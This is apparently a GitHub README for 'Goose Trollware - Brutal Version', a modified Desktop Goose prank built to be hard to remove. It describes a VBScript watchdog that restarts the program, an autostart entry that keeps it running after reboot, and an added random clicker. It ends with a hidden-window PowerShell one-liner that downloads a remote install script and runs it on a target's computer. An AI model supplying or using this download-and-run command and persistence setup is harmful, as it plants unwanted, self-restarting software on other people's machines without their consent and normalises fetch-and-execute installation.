# Goose Trollware - Brutal Version

This is the same as my other goose trollware repository, except it's harder to remove, I added a few memes and text files of my own, and added a random clicker mod.

See [here](https://desktop-goose.en.uptodown.com/windows) for the original program and author. 


The original program is just a goose that walks around your screen, sometimes leaving footmarks, opening text files or opening memes. You can typically close it with task manager or by holding escape. 

In my version, the gooes is launched using a VBScript to start it again if it is stopped. On top of that, it writes this script to an autostart location so that the duck starts up when you boot your computer. 

---

`i.ps1`: The install script

`run.vbs`: The vbs startup script. This one automatically presses Yes to the question about mods.

---

To install on a computer, run `powershell -W H -Ex B -c "iex (iwr 'https://github.com/Reginald-Gillespie/G2/raw/main/i.ps1').Content"` in the Run Dialogue.
